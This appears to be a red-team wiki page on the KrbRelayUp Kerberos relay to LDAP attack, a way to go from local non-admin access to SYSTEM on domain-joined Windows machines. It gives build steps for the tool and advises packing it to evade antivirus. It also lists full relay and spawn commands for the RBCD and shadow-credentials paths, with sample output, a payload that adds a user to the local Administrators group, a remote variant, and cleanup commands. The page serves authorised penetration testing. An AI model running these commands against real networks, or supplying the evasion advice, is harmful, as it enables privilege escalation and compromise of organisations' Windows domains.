**Kerberos relay to LDAP (KrbRelayUp)** — from a local (non-admin) access on a domain-joined Windows machine, coerce a service running as `NT AUTHORITY\SYSTEM` to authenticate over RPC/DCOM using Kerberos with an arbitrary SPN, and relay that authentication to a Domain Controller's LDAP service (when LDAP signing / Channel Binding is not enforced). The relayed session is then used like the [NTLM Relay to LDAP](../NTLM%20Relay/NTLM%20Relay%20to%20LDAP.md) attacks (RBCD or Shadow Credentials) - the end result is local admin (SYSTEM).

## Discovery

Check whether LDAP signing / Channel Binding are enforced - see the Discovery section of [NTLM Relay to LDAP](../NTLM%20Relay/NTLM%20Relay%20to%20LDAP.md).

## Exploitation

Four steps: build the exploit, coerce+relay, execute as SYSTEM, cleanup.

### Build the .NET exploit

Prerequisites: a Windows VM, Visual Studio (Community), and the **.NET desktop development** workload.

1. Clone https://github.com/Dec0ne/KrbRelayUp
2. Open the solution in Visual Studio.
3. Select the `Release` configuration and build.
4. The binary is in `.\KrbRelayUp\KrbRelayUp\bin\Release\`.

**Warning:** The binary is detected statically by AV. You will likely need to obfuscate/pack it, unless you can lean on weak configs (e.g. loose Defender exclusions).

### Step 1: Coerce and relay

**Case 1: RBCD, no machine account** (requires that the domain lets users create computer accounts - see [Computer Account Creation](../../Reconnaissance/Computer%20Account%20Creation%20%28MAQ%29.md)). The exploit creates a computer account and uses it to configure RBCD.

```batch

KrbRelayUp.exe relay --Domain "DOMAIN" --CreateNewComputerAccount --ComputerName "COMPUTER_NAME$" --Method rbcd

```

**Note:** `--Method rbcd` is the default. Use `--ComputerName` to name the created account, and include an identifiable keyword (e.g. `ATTACK`) so you can find and remove it during cleanup.

```console

C:\Users\dummy\Desktop>.\KrbRelayUp.exe relay --Domain "domain.local" --CreateNewComputerAccount --ComputerName "ATTACK01$" --Method rbcd
KrbRelayUp - Relaying you to SYSTEM

[+] Computer account "ATTACK01$" added with password "yX8#wX2-cM2-eB1/"
[+] Forcing SYSTEM authentication
[+] Got Krb Auth from NT/SYSTEM. Relaying to LDAP now...
[+] LDAP session established
[+] RBCD rights added successfully
[+] Run the spawn method for SYSTEM shell:
    ./KrbRelayUp.exe spawn -m rbcd -d domain.local -dc DC01.domain.local -cn ATTACK01$ -cp yX8#wX2-cM2-eB1/

```

**Case 2: RBCD, existing machine account** (you know its password or NT hash). Same as Case 1 without `--CreateNewComputerAccount`.

```batch

KrbRelayUp.exe relay --Domain "DOMAIN" --ComputerName "COMPUTER_NAME$" --Method rbcd

```

**Case 3: Shadow credentials** (same prereqs as Attack 4 in [NTLM Relay to LDAP](../NTLM%20Relay/NTLM%20Relay%20to%20LDAP.md)). Adds an entry to the target computer's `msDS-KeyCredentialLink`. Main advantage over RBCD: no computer account needed.

```batch

KrbRelayUp.exe relay --Domain "DOMAIN" --Method shadowcred

```

### Step 2: Execute code as SYSTEM

On success, Step 1 prints the command to run to execute an arbitrary command as `NT AUTHORITY\SYSTEM`.

**Warning:** The default generated command spawns an interactive SYSTEM prompt and needs the executable present on disk. Use it only with a fully interactive session (workstation / Terminal session). Otherwise pass a non-interactive `--ServiceCommand`.

**Case 1: RBCD**

```batch

KrbRelayUp.exe spawn --Method rbcd --Domain "DOMAIN" --DomainController "DC_FQDN" --ComputerName "COMPUTER_NAME$" --ComputerPassword "COMPUTER_PASS" --ServiceCommand "net localgroup Administrators DOMAIN\USER_NAME /add"

```

**Note:** Use `--ComputerPasswordHash` instead of `--ComputerPassword` to pass an NT hash.

**Case 2: Shadow credentials**

```batch

KrbRelayUp.exe spawn --Method shadowcred --Domain "DOMAIN" --DomainController "DC_FQDN" --Certificate "CERT_BASE64" --CertificatePassword "CERT_PASS" --ServiceCommand "net localgroup Administrators DOMAIN\USER_NAME /add"

```

### Step 3: Cleanup

Needs the compromised machine's computer account (or a domain account with write permission on it, e.g. a Domain Admin).

**Case 1: RBCD** - reset `msDS-AllowedToActOnBehalfOfOtherIdentity` on the target computer account (packaged `rbcd_x64.exe` wraps Impacket's `rbcd.py`).

```batch

REM With a Domain Admin account
rbcd_x64.exe -delegate-to "TARGET_NAME$" -delegate-from "COMPUTER_NAME$" -action remove -use-ldaps -dc-ip DC_IP "DOMAIN/DA_NAME:DA_PASS"
REM With the target computer account's NT hash
rbcd_x64.exe -delegate-to "TARGET_NAME$" -delegate-from "COMPUTER_NAME$" -action remove -use-ldaps -dc-ip DC_IP "DOMAIN/TARGET_NAME$" -hashes ":TARGET_NT_HASH"

```

**Case 2: Shadow credentials** - remove the device from `msDS-KeyCredentialLink` (packaged `pywhisker_x64.exe`). Get `DEVICE_GUID` from the Step 1 output.

```batch

REM With a Domain Admin account
pywhisker_x64.exe -d "DOMAIN" -u "DA_NAME" -p "DA_PASS" --target "TARGET_NAME$" --action remove --device-id "DEVICE_GUID" --dc-ip "DC_IP"
REM With the target computer account's NT hash
pywhisker_x64.exe -d "DOMAIN" -u "TARGET_NAME$" -H "TARGET_NT_HASH" --target "TARGET_NAME$" --action remove --device-id "DEVICE_GUID" --dc-ip "DC_IP"

```

## Remote variant (RemoteKrbRelay)

The same RBCD / Shadow Credentials outcomes, but triggered remotely against a vulnerable DCOM object on the victim (no code runs locally):

```batch

RemoteKrbRelay.exe -rbcd -victim VICTIM_FQDN -target DC_FQDN -clsid CLSID -cn FAKEMACHINE$
RemoteKrbRelay.exe -shadowcred -victim VICTIM_FQDN -target DC_FQDN -clsid CLSID -forceshadowcred
RemoteKrbRelay.exe -laps -victim VICTIM_FQDN -target DC_FQDN -clsid CLSID

```

## Caution

**Warning:** **DCOM hardening (~Nov 2022, CVE-2021-26414)** enforces packet integrity, so the local COM path (KrbRelayUp) often fails to relay to LDAP on patched hosts - LDAP signing / Channel Binding must be off, and when the local path fails the AD CS route ([Kerberos Relay to ADCS](Kerberos%20Relay%20to%20ADCS.md)) is the usual fallback. See [_Intro to Kerberos Relay](_Intro%20to%20Kerberos%20Relay.md).

**Warning:** Cleartext passwords on the command line can end up in the PowerShell history. Do not skip cleanup, including removing any created computer account - if you cannot, note the remaining artifacts in the report.

## References

- KrbRelayUp - https://github.com/Dec0ne/KrbRelayUp
- pywhisker - https://github.com/ShutdownRepo/pywhisker
- rbcd.py (Impacket) - https://github.com/fortra/impacket/tree/master/examples
- RemoteKrbRelay - https://github.com/CICADA8-Research/RemoteKrbRelay
